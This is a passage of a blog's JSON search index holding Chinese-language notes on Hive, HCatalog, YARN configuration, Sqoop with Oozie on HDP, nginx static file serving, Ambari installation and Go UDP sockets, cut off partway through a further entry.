    "http:\/\/localhost:1313\/post\/bigdata\/hive\/": {
        
        "title": "Hive",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hive\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/hive\/hive-intro\/": {
        
        "title": "Hive Intro",
            "tags": [ "Hive", ],
    "content": "Reference * Hive document ", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hive\/hive-intro\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hcatalog\/": {
        
        "title": "HCatalog",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hcatalog\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/hcatalog\/": {
        
        "title": "HCatalog",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/hcatalog\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/hcatalog\/": {
        
        "title": "HCatalog",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hcatalog\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/hcatalog\/hcatalog\/": {
        
        "title": "Hcatalog简介",
            "tags": [ "HCatalog", ],
    "content": "HCatalog是Hadoop生态链中的一个有趣的组件。HCatalog构建于Hive的metastore之上并结合了Hive的DDL，通过服务的形式开放给Hadoop生态链中的其他组件，这样即可用一种统一的形式将Hive数据仓库中的数据的metadata开放给需要的服务，这样的话需要的服务就可以通过HCatalog来了解到所使用的数据的内容以及格式等等元信息。\n下图展示了HCatalog在Hadoop生态系统中的定位：\n可以看出HCatalog内置可以支持多种数据格式：\nORC RC Text SequenceFile 另外用户还可以自定义格式，不过需要编写InputFormat, OutputFormat, SerDe(Serializer/Deserializer):\nHCatalog提供了\u0026rsquo;hcat'\n参数**-e**提供了使用Hive \u0026lsquo;DDL\u0026rsquo;命令的接口\nDDL命令 解释 CREATE TABLE 建表操作，注意如果建表时使用了“CLUSTERED BY”那么这个表不能被Pig和MapReduce使用 ALTER TABLE 修改表 SHOW TABLES 查询表 DROP TABLE 删除表 CREATE/ALTER/DROP VIEW 管理view SHOW PARTITIONS 查询分区表的分区信息 Create/Drop Index 管理index DESCRIBE 查询表结构 例子：\nAPIs\nAPI 解释 HCatReader 从hdfs中读取数据 HCatWriter 向hdfs中写入数据 DataTransferFactory 创建HCatReader/HCatWriter实例 HCatInputFormat 利用MapReduce job从表结构由HCatalog管理的表中读取并处理数据 HCatOutputFormat 利用MapReduce job处理数据并向表结构由HCatalog管理的表中写入数据 HCatLoader Pig script用来读取表结构由HCatalog管理的数据 HCatStorer Pig script用来写入表结构由HCatalog管理的数据 参考信息 HCataLog quick guide Hive metastore ", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hcatalog\/hcatalog\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/yarn\/": {
        
        "title": "Yarn",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/yarn\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/yarn\/": {
        
        "title": "Yarn",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/yarn\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/yarn\/": {
        
        "title": "Yarn",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/yarn\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/yarn\/yarn-config\/": {
        
        "title": "Yarn Config",
            "tags": [ "Yarn", ],
    "content": "\nResource manager\nNode manager\nApplication master\n资源\nContainer\ncontainer所需资源，minimum/maximum memory/vcores Scheduler\nFIFO CapacityScheduler FairScheduler Queue\nApplication \u0026mdash; scheduler \u0026mdash;\u0026gt; Queue\nyarn-site.xml中配置。\n下文引用自http://dongxicheng.org/mapreduce-nextgen/hadoop-yarn-configurations-resourcemanager-nodemanager/\nNode manager Node manager architecture\nResourceManager相关配置参数 （1） yarn.resourcemanager.address 参数解释：ResourceManager 对客户端暴露的地址。客户端通过该地址向RM提交应用程序，杀死应用程序等。\n默认值：${yarn.resourcemanager.hostname}:8032\n（2） yarn.resourcemanager.scheduler.address 参数解释：ResourceManager 对ApplicationMaster暴露的访问地址。ApplicationMaster通过该地址向RM申请资源、释放资源等。\n默认值：${yarn.resourcemanager.hostname}:8030\n（3） yarn.resourcemanager.resource-tracker.address 参数解释：ResourceManager 对NodeManager暴露的地址.。NodeManager通过该地址向RM汇报心跳，领取任务等。 默认值：${yarn.resourcemanager.hostname}:8031\n（4） yarn.resourcemanager.admin.address 参数解释：ResourceManager 对管理员暴露的访问地址。管理员通过该地址向RM发送管理命令等。\n默认值：${yarn.resourcemanager.hostname}:8033\n（5） yarn.resourcemanager.webapp.address 参数解释：ResourceManager对外web ui地址。用户可通过该地址在浏览器中查看集群各类信息。\n默认值：${yarn.resourcemanager.hostname}:8088\n（6） yarn.resourcemanager.scheduler.class 参数解释：启用的资源调度器主类。目前可用的有FIFO、Capacity Scheduler和Fair Scheduler。\n默认值： org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler\n（7） yarn.resourcemanager.resource-tracker.client.thread-count 参数解释：处理来自NodeManager的RPC请求的Handler数目。\n默认值：50\n（8） yarn.resourcemanager.scheduler.client.thread-count 参数解释：处理来自ApplicationMaster的RPC请求的Handler数目。\n默认值：50\n（9） yarn.scheduler.minimum-allocation-mb/ yarn.scheduler.maximum-allocation-mb 参数解释：单个可申请的最小/最大内存资源量。比如设置为1024和3072，则运行MapRedce作业时，每个Task最少可申请1024MB内存，最多可申请3072MB内存。\n默认值：1024/8192\n（10） yarn.scheduler.minimum-allocation-vcores / yarn.scheduler.maximum-allocation-vcores 参数解释：单个可申请的最小/最大虚拟CPU个数。比如设置为1和4，则运行MapRedce作业时，每个Task最少可申请1个虚拟CPU，最多可申请4个虚拟CPU。什么是虚拟CPU，可阅读我的这篇文章：“YARN 资源调度器剖析”。\n默认值：1/32\n（11） yarn.resourcemanager.nodes.include-path /yarn.resourcemanager.nodes.exclude-path 参数解释：NodeManager黑白名单。如果发现若干个NodeManager存在问题，比如故障率很高，任务运行失败率高，则可以将之加入黑名单中。注意，这两个配置参数可以动态生效。（调用一个refresh命令即可）\n默认值：“”\n（12） yarn.resourcemanager.nodemanagers.heartbeat-interval-ms 参数解释：NodeManager心跳间隔\n默认值：1000（毫秒）\nNodeManager相关配置参数 （1） yarn.nodemanager.resource.memory-mb 参数解释：NodeManager总的可用物理内存。注意，该参数是不可修改的，一旦设置，整个运行过程中不可动态修改。另外，该参数的默认值是8192MB，即使你的机器内存不够8192MB，YARN也会按照这些内存来使用（傻不傻？），因此，这个值通过一定要配置。不过，Apache已经正在尝试将该参数做成可动态修改的。\n默认值：8192\n（2） yarn.nodemanager.vmem-pmem-ratio 参数解释：每使用1MB物理内存，最多可用的虚拟内存数。\n默认值：2.1\n（3） yarn.nodemanager.resource.cpu-vcores 参数解释：NodeManager总的可用虚拟CPU个数。\n默认值：8\n（4） yarn.nodemanager.local-dirs 参数解释：中间结果存放位置，类似于1.0中的mapred.local.dir。注意，这个参数通常会配置多个目录，已分摊磁盘IO负载。\n默认值：${hadoop.tmp.dir}/nm-local-dir\n（5） yarn.nodemanager.log-dirs 参数解释：日志存放地址（可配置多个目录）。\n默认值：${yarn.log.dir}/userlogs\n（6） yarn.nodemanager.log.retain-seconds 参数解释：NodeManager上日志最多存放时间（不启用日志聚集功能时有效）。\n默认值：10800（3小时）\n（7） yarn.nodemanager.aux-services 参数解释：NodeManager上运行的附属服务。需配置成mapreduce_shuffle，才可运行MapReduce程序\n默认值：“”\nyarn-site.xml yarn.scheduler.minimum-allocation-mb:341 yarn.scheduler.increment-allocation-mb: yarn.scheduler.maximum-allocation-mb:1023\n节点分配给NodeManager的可用内存 yarn.nodemanager.resource.memory-mb:1023\nyarn.scheduler.minimum-allocation-mb \u0026lt; yarn.nodemanager.resource.memory-mb yarn.scheduler.maximum-allocation-mb:1023 \u0026lt; yarn.nodemanager.resource.memory-mb\nmapred-site.xml yarn.app.mapreduce.am.resource.mb： 341 mapreduce.map.memory.mb：341 mapreduce.reduce.memory.mb：682 mapreduce.task.io.sort.mb：190\nmapreduce.map.java.opts: -Xmx272m mapreduce.reduce.java.opts: -Xmx545m\nResource manager: bdtest-002\nApplication manager:\nNode manager:\nYarn操作 查看application log\n$ yarn logs -applicationId applicationID 控制application\nyarn application -list yarn application -status yarn application -kill Yarn参考文章 Yarn scheduler Yarn configure ", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/yarn\/yarn-config\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/etl\/": {
        
        "title": "ETL",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/etl\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hadoop\/": {
        
        "title": "Hadoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hadoop\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/sqoop\/": {
        
        "title": "Sqoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/sqoop\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/sqoop\/": {
        
        "title": "Sqoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/sqoop\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/sqoop\/": {
        
        "title": "Sqoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/sqoop\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/sqoop\/sqoop\/": {
        
        "title": "Sqoop介绍及使用",
            "tags": [ "Sqoop",  "ETL",  "Hadoop", ],
    "content": "1. HDP中使用sqoop进行工作流处理准备工作 1.1 准备hdfs中的用户目录 在进行hdfs操作前需要切换用户到\u0026rsquo;hdfs'\n# su - hdfs 为操作用户创建hdfs环境\n此处为ambari的admin用户准备环境：\n$ hdfs dfs -mkdir /user/admin $ hdfs dfs -chown admin:hdfs /user/admin $ hdfs dfs -ls /user $ hdfs dfs -chmod -R 770 /user/admin 1.2 配置ozzie 设置ozzie进程在hdfs中的proxy user\n配置项：hadoop.proxyuser.oozie.groups 值：$USER_GROUPS_THAT_ALLOW_IMPERSONATION 配置项: hadoop.proxyuser.oozie.hosts 值：$OOZIE_SERVER_HOSTNAME PS. 代理机制 ：http://dongxicheng.org/mapreduce-nextgen/hadoop-secure-impersonation/\n主备namenode和resoucemanager（hadoop 2.0）上的core-site.xml中增加以下配置:\n\u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hadoop.proxyuser.oozie.groups\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;group1,group2\u0026lt;value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hadoop.proxyuser.oozie.hosts\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;host1,host2\u0026lt;value\u0026gt; \u0026lt;/property\u0026gt; 这里，假设用户user1属于group1（注意，这里的user1和group1都是linux用户和用户组，需要在namenode和jobtracker上进行添加），此外，为了限制客户端随意部署，超级用户代理功能只支持host1和host2两个节点。经过以上配置后，在host1和host2上的客户端上，属于group1和group2的用户可以sudo成oozie用户，执行作业流。\n拷贝mysql-connector及配置 切换到oozie用户后执行：\n# 复制mysql-connector $ hdfs dfs -put /$PATH/mysql-connector-java-5.1.37.jar /user/oozie/share/lib/lib_$TIMESTAMP/sqoop # 复制配置文件 $ hdfs dfs -put /etc/hive/conf/hive-site.xml /user/oozie/share/lib/lib_20171226172323/hive $ hdfs dfs -put /etc/hive2/conf/hive-site.xml /user/oozie/share/lib/lib_20171226172323/hive2 # 通知Ozzie使用新的sharelib $ oozie admin -sharelibupdate HDP doc\nsqoop基本操作 https://sqoop.apache.org/docs/1.4.4/SqoopUserGuide.html#_importing_data_into_hive\n列举数据库(list-databases)\n# sqoop list-databases --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P SLF4J: Class path contains multiple SLF4J bindings. SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/hadoop/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class] SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/accumulo/lib/slf4j-log4j12.jar!/org/slf4j/impl/StaticLoggerBinder.class] SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation. SLF4J: Actual binding is of type [org.slf4j.impl.Log4jLoggerFactory] 17/12/25 18:27:40 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6.2.6.3.0-235 Enter password: 17/12/25 18:27:44 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset. information_schema iot_test_12 mysql 简单查询(eval)\n# sqoop eval --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --query \u0026quot;select date(add_time), count(*) from device group by date(add_time)\u0026quot; SLF4J: Class path contains multiple SLF4J bindings. SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/hadoop/lib/slf4j-log4j12-1.7.10.jar!/org/slf4j/impl/StaticLoggerBinder.class] SLF4J: Found binding in [jar:file:/usr/hdp/2.6.3.0-235/accumulo/lib/slf4j-log4j12.jar!/org/slf4j/impl/StaticLoggerBinder.class] SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation. SLF4J: Actual binding is of type [org.slf4j.impl.Log4jLoggerFactory] 17/12/25 18:32:47 INFO sqoop.Sqoop: Running Sqoop version: 1.4.6.2.6.3.0-235 Enter password: 17/12/25 18:32:52 INFO manager.MySQLManager: Preparing to use a MySQL streaming resultset. ------------------------------------- | date(add_time) | count(*) | ------------------------------------- | 2017-06-16 | 3 | | 2017-06-23 | 1 | | 2017-06-28 | 1 | | 2017-07-06 | 1 | | 2017-07-15 | 1 | | 2017-07-24 | 6 | | 2017-07-25 | 2 | | 2017-07-26 | 11 | | 2017-07-27 | 56 | | 2017-07-28 | 2 | | 2017-07-29 | 28 | | 2017-07-31 | 373 | | 2017-08-01 | 96 | | 2017-08-02 | 3 | | 2017-08-03 | 2 | | 2017-08-09 | 2 | | 2017-08-15 | 1 | | 2017-08-19 | 1 | | 2017-09-02 | 4 | | 2017-09-07 | 4 | | 2017-09-08 | 1 | | 2017-09-19 | 3 | | 2017-10-10 | 1 | | 2017-11-02 | 2 | | 2017-11-03 | 1 | | 2017-11-17 | 1 | | 2017-11-29 | 1 | | 2017-12-04 | 2 | | 2017-12-05 | 1 | | 2017-12-07 | 1 | | 2017-12-15 | 1 | ------------------------------------- 导入hive\n将一张表导入hive： 注意，需要使用hive用户：\n# su - hive $ sqoop-import --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --table device --hive-import -m 1 导入后的数据可以从hdfs中看到：\n$ hdfs dfs -ls /apps/hive/warehouse/device Found 1 items -rwxrwxrwx 3 hive hadoop 62177 2017-12-27 18:11 /apps/hive/warehouse/device/part-m-00000 配置hive-site.xml的warehouse：\n\u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hive.warehouse.subdir.inherit.perms\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; 将所有表导入hive:\n# su - hive $ sqoop import-all-tables --connect jdbc:mysql://192.168.1.1/iot_test_12 --username iot -P --warehouse-dir /apps/hive/warehouse/IOT --hive-import --create-hive-table -m 1 指定目标目录（\u0026ndash;warehouse-dir /apps/hive/warehouse/IOT）：\n从hive导出\n$ sqoop export --connect jdbc:mysql://localhost/db --username root --table employee --export-dir /emp/emp_data Job管理\nsqoop job --list sqoop job --show 'jobname' sqoop job --exec 'jobname' Issue 1: Application is added to the scheduler and is not yet activated. Queue\u0026rsquo;s AM resource limit exceeded. Details : AM Partition = \u0026lt;DEFAULT_PARTITION\u0026gt;; AM Resource Request = \u0026lt;memory:512, vCores:1\u0026gt;; Queue Resource Limit for AM = \u0026lt;memory:512, vCores:1\u0026gt;; User AM Resource Limit of the queue = \u0026lt;memory:512, vCores:1\u0026gt;; Queue AM Resource Usage = \u0026lt;memory:1023, vCores:1\u0026gt;;\n创建工作流(WFM) https://community.hortonworks.com/articles/84394/apache-ambari-workflow-manager-view-for-apache-ooz-3.html\n1.创建动作用sqoop获取数据 ​Create the Sqoop Action to Extract Data\nCommand: import \u0026ndash;connect jdbc:mysql://192.168.1.1/iot_test_12 \u0026ndash;username iot \u0026ndash;password-file /user/admin/iot.passwd \u0026ndash;table iottest \u0026ndash;split-by rowkey \u0026ndash;hive-import -m 1\nAdvanced -\u0026gt; File:\n/user/oozie/share/lib/lib_20171226172323/hive/hive-site.xml 2. Ambari restart Shut down all services using Ambari.\nShutdown ambari-agents on all nodes.\nShutdown ambari-server.\nReboot all nodes as required .\nRestart ambari-server, agents and services in that order.\nhadoop 停止Hadoop任务：\nhadoop job -kill job-id misc Apache Tez The Apache TEZ® project is aimed at building an application framework which allows for a complex directed-acyclic-graph of tasks for processing data. It is currently built atop Apache Hadoop YARN.\nTez \u0026mdash; (manage DAG task) \u0026mdash;\u0026gt; Yarn\nEmpowering end users by:\nExpressive dataflow definition APIs Flexible Input-Processor-Output runtime model Data type agnostic Simplifying deployment Execution Performance:\nPerformance gains over Map Reduce Optimal resource management Plan reconfiguration at runtime Dynamic physical data flow decisions HDP中提交的Hive查询任务通过Tez调度执行\n", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/sqoop\/sqoop\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/nginx\/": {
        
        "title": "nginx",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/nginx\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/nginx\/": {
        
        "title": "Nginx",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/nginx\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/nginx\/nginx-static\/": {
        
        "title": "Nginx Static",
            "tags": [ "nginx",  "static", ],
    "content": "nginx配置静态文件服务器\n搭建文件服务器 要点就是root目录,会自动指向索引文件 如： index, index.html等\nserver { client_max_body_size 4G; listen 80; ## listen for ipv4; this line is default and implied server_name static.test.sdk.iwplay.com.tw; root /home/mini/Sync; location / { } } 建立索引 建立目录索引也同样如此，不要带索引名称之类的文件，否则会直接显示文件，而不是目录\nserver { client_max_body_size 4G; listen 80; ## listen for ipv4; this line is default and implied server_name static.test.sdk.iwplay.com.tw; root /home/mini/Sync; location / { autoindex on; //显示索引 autoindex_exact_size on; //显示大小 autoindex_localtime on; //显示时间 } } 设置密码 搭建文件服务器有时候不想让别人任意访问，想做成一个私有的该怎么办呢，这个时候我们可以用到nginx自带的认证模块。 同样关键的是auth_basic/auth_basic_user_file字段\nserver { client_max_body_size 4G; listen 80; ## listen for ipv4; this line is default and implied server_name static.test.sdk.iwplay.com.tw; root /home/mini/Sync; location / { auth_basic \u0026quot;Restricted\u0026quot;; auth_basic_user_file /etc/nginx/pass_file; autoindex on; autoindex_exact_size on; autoindex_localtime on; } } auth_basic表示的输入密码时的提示语 auth_basic_user_file则显示认证时的用户密码文件存放路径 生成用户密码 上文实现了用户认证，那么如何添加用户呢。nginx自带了一个功能，如下\nhtpasswd -c -d /etc/nginx/pass_file username 这样就在/etc/nginx/pass_file 中添加了了一个用户\n开启压缩 server { client_max_body_size 4G; listen 80; ## listen for ipv4; this line is default and implied server_name static.test.sdk.iwplay.com.tw; root /home/mini/Sync; # new config lines for gzip gzip on; gzip_min_length 1k; gzip_buffers 4 8k; gzip_http_version 1.1; gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml; location / { auth_basic \u0026quot;Restricted\u0026quot;; auth_basic_user_file /etc/nginx/pass_file; autoindex on; autoindex_exact_size on; autoindex_localtime on; } } ", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/nginx\/nginx-static\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/static\/": {
        
        "title": "Static",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/static\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/ambari\/": {
        
        "title": "Ambari",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/ambari\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/hadoop\/": {
        
        "title": "Hadoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/hadoop\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/hadoop\/": {
        
        "title": "Hadoop",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hadoop\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hortonworks\/": {
        
        "title": "Hortonworks",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hortonworks\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/bigdata\/hadoop\/hdp\/": {
        
        "title": "Horwonworks HDP 2.6安装过程",
            "tags": [ "Hadoop",  "Hortonworks",  "Ambari", ],
    "content": "安装ambari-server # yum install ambari-server 配置ambari cluster # ambari-server setup # ambari-server start 配置cluster 步骤1:\n将clsuter中的所有node设置成ssh免密码登录了的方式。\n步骤2:\n访问 http://\u0026lt;ambari-server\u0026gt;:8080\n步骤3:\n设置cluster名称\n步骤4:\n配置安装源，可以使用私有源：\nHDP私有源：\nhttp://hdp-repo.iwaterdata.com:7300/HDP/centos7/2.x/updates/2.6.3.0 HDP-UTILS私有源：\nhttp://hdp-repo.iwaterdata.com:7300/HDP-UTILS-1.1.0.21/repos/centos7 步骤5:\n安装程序检查配置节点\n步骤6:\n选择安装软件列表\n步骤7:\n设置各软件的配置信息\n步骤8:\n安装完成后程序会尝试启动各服务，有可能启动会失败（比如内存不足无法启动所有程序），只要确定程序正确安装可以继续\nmisc 设置JDBC driver(Customize service中 oozie需要)\n# ambari-server setup --jdbc-db=mysql --jdbc-driver=/usr/share/java/mysql-connector-java.jar ", 
    "url": "http:\/\/localhost:1313\/post\/bigdata\/hadoop\/hdp\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/go\/": {
        
        "title": "Go",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/go\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/": {
        
        "title": "Go",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/golang\/": {
        
        "title": "Golang",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/golang\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/golang-udp\/": {
        
        "title": "golang UDP中Read()\/ReadFromUDP()\/Write()\/WriteToUDP()的使用",
            "tags": [ "golang",  "UDP",  "Read",  "ReadFromUDP",  "Write",  "WriteToUDP", ],
    "content": "学习golang进行UDP client/server通讯的过程中发现Read/ReadFromUDP/Write/WriteToUDP的使用有些需要注意之处，这里记录一下。\n代码实验 UDP server UDP服务器端在调用\u0026quot;net.ListenUDP()\u0026ldquo;后创建\u0026quot;net.UDPConn\u0026rdquo;，read/write操作是通过这个UDPConn来完成的。因为listen的时候只指定了本地绑定的地址，它只能被动的接收来自客户端的消息，因此这个UDPConn在golang中为\u0026rsquo;unconnected\u0026rsquo;类型的。\n这种类型的UDPConn的读操作可以接受Read()及ReadFromUDP()。区别是Read()无法知道远程连接的地址信息而ReadFromUDP()可以，所以如果后续需要跟远程进行双向通讯需要使用ReadFromUDP()。\n这种类型的UDPConn在进行写操作时必须使用WriteToUDP()完成，并且需要指定对方的地址信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package main import ( \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) var host = flag.String(\u0026#34;host\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Specify the hostname\u0026#34;) var port = flag.Int(\u0026#34;port\u0026#34;, 12345, \u0026#34;Specify the port\u0026#34;) func main() { flag.Parse() var udpAddr = net.UDPAddr{ IP: net.ParseIP(*host), Port: *port, } conn, err := net.ListenUDP(\u0026#34;udp\u0026#34;, \u0026amp;udpAddr) if err != nil { fmt.Println(\u0026#34;Error listening:\u0026#34;, err) os.Exit(1) } defer conn.Close() var data = make([]byte, 1024) for { n, remoteAddr, err := conn.ReadFromUDP(data) // conn.Read() also works here if err != nil { fmt.Println(\u0026#34;Error read UDP:\u0026#34;, err.Error()) } if n \u0026lt;= 0 { continue } fmt.Printf(\u0026#34;[%v]:\u0026#34;, remoteAddr) fmt.Println(data[:n]) _, err = conn.WriteToUDP(data, remoteAddr) //_, err = conn.Write(data) // conn.Write() doesn\u0026#39;t work here if err != nil { fmt.Println(\u0026#34;Error write UDP:\u0026#34;, err.Error()) } } } UDP client UDP客户端的连接通过\u0026quot;net.DialUDP()\u0026ldquo;来创建。因为这个连接创建时指定了远程服务器地址，因此这种连接在golang中称为\u0026rsquo;connected\u0026rsquo;类型的连接。\n这种类型的连接进行读操作可以使用Read()及ReadFromUDP()，区别在前面已经说过了，主要区别就是ReadFromUDP()会返回远程端的地址信息。\n这种类型的连接进行写操作只能用Write()，如果使用WriteToUDP()则无法完成数据发送。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 package main import ( \u0026#34;bufio\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; ) var host = flag.String(\u0026#34;host\u0026#34;, \u0026#34;127.0.0.1\u0026#34;, \u0026#34;Specify the target host IP\u0026#34;) var port = flag.Int(\u0026#34;port\u0026#34;, 12345, \u0026#34;Specifiy the target host port\u0026#34;) func main() { flag.Parse() var targetAddr = net.UDPAddr{ IP: net.ParseIP(*host), Port: *port, } conn, err := net.DialUDP(\u0026#34;udp\u0026#34;, nil, \u0026amp;targetAddr) if err != nil { fmt.Println(\u0026#34;Error DialUDP,\u0026#34;, err.Error()) os.Exit(1) } defer conn.Close() reader := bufio.NewReader(os.Stdin) for { fmt.Print(\u0026#34;\u0026gt; \u0026#34;) data, _, err := reader.ReadLine() if err != nil { continue } if string(data) == \u0026#34;quit\u0026#34; { fmt.Println(\u0026#34;Quit now ...\u0026#34;) os.Exit(0) } fmt.Println(\u0026#34;Writing: \u0026#34;, data) //conn.WriteToUDP(data, \u0026amp;targetAddr) // conn.WriteToUDP() doesn\u0026#39;t work here n, err := conn.Write(data) fmt.Printf(\u0026#34;Written %d bytes\u0026#34;, n) if err != nil { fmt.Println(\u0026#34;Error WriteToUDP: \u0026#34;, err.Error()) } //n, _, err = conn.ReadFromUDP(data) // conn.ReadFromUDP() works here n, err = conn.Read(data) if err != nil { fmt.Println(\u0026#34;Error ReadFromUDP: \u0026#34;, err.Error()) continue } fmt.Println(string(data)) } } connected vs unconnected unconnected: 不知道远程地址的socket server调用listenUDP()创建的UDPConn为unconnected状态 connected: 知道远程地址的socket client调用DialUDP()创建的UDPConn为connectd状态 socket状态 Read方法 Write方法 connected ReadFromUDP()Read() Write() unconnected ReadFromUDP()Read() WriteToUDP() 其他注意点： net.ListenUDP()的第一个参数必须为小写\u0026rsquo;udp' ReadFromUDP()中的参数[]byte长度必须大于0，否则这个函数会在调用后迅速返回，最终会导致CPU使用率飙升。参见语言编程陷阱，陷阱2 ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/go\/golang-udp\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/read\/": {
        
        "title": "Read",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/read\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/readfromudp\/": {
        
        "title": "ReadFromUDP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/readfromudp\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/udp\/": {
        
        "title": "UDP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/udp\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/write\/": {
        
        "title": "Write",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/write\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/writetoudp\/": {
        
        "title": "WriteToUDP",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/writetoudp\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/dependency-management\/": {
        
        "title": "Dependency Management",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/dependency-management\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/go\/": {
        
        "title": "Go",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/go\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/go\/go-deps\/": {
        
        "title": "GO语言依赖管理那些事儿",
            "tags": [ "Go",  "dependency management", ],
